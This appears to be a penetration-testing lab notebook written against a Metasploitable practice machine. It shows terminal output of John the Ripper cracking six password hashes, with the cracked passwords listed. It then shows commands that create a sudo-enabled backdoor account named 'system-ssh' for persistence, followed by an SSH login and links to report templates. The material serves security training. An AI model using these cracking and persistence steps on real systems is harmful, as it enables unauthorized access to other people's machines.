`Password cracking`
```
root@ip-10-0-1-231:/home/sysadmin# john crack.txt 
Loaded 6 password hashes with 6 different salts (md5crypt [MD5 32/64 X2])
Press 'q' or Ctrl-C to abort, almost any other key for status
postgres         (postgres)
user             (user)
service          (service)
123456789        (klog)
cybersecurity    (msfadmin)
Password!        (tstark)
6g 0:00:00:07 100% 2/3 0.7832g/s 12758p/s 12764c/s 12764C/s Sss2..Password!
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

```
root@metasploitable:/home/msfadmin# useradd -m -s /bin/bash system-ssh
root@metasploitable:/home/msfadmin# echo "system-ssh:password" | sudo chpasswd
root@metasploitable:/home/msfadmin# usermod -aG sudo system-ssh
root@metasploitable:/home/msfadmin#
root@metasploitable:/home/msfadmin# cat /etc/passwd | grep system-ssh
system-ssh:x:1005:1005::/home/system-ssh:/bin/bash
```

`Persistance`
```
┌──(root💀kali)-[~]
└─# ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -p 2222 msfadmin@172.22.117.150         255 ⨯
msfadmin@172.22.117.150's password:
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Sat Mar 29 13:42:16 2025 from 172.22.117.100
msfadmin@metasploitable:~$

```

`Reporting`

```
Pen test reporting sample - https://penconsultants.com/resources/sample-security-testing-report/ 

or https://pentestreports.com/templates 

https://docs.google.com/document/d/1CQND2SwgSo6bRz_gN3NPVmgu3Ht3e5ZPpfckxdngoho/edit?usp=sharing

https://docs.google.com/document/d/1jr_zqnUS2vkrJ2fRXuOZSJ5WsxSTgKczQsvp8FAl6_s/edit?usp=sharing
```